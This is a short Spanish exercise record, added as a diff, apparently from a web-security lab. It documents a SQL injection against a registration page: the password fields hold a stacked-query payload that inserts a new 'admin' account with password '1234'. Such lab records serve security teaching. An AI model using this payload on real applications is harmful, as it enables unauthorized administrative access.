@@ -1,0 +1,20 @@
+Ejercicio: 4
+
+Objetivo:
+    crear un nuevo usuario admin sin la restriccion de que el campo user sea unico
+
+Punto de entrada:
+    user/register.php
+
+Datos:
+    user: a
+    name: a
+    Blog title: a
+    password:  f',time());INSERT INTO users (id, name, user, password, created_at) VALUES (null, 'Administrador', 'admin', '1234', time()) --"
+    password2: f',time());INSERT INTO users (id, name, user, password, created_at) VALUES (null, 'Administrador', 'admin', '1234', time()) --"
+URL:
+    /index.php?infoMessage=User+%27a%27+successfully+registerred
+
+Identificador:
+    20210426-162129 7dffb1b99f4b7bb87f3a80c8c5f3b6e8
+
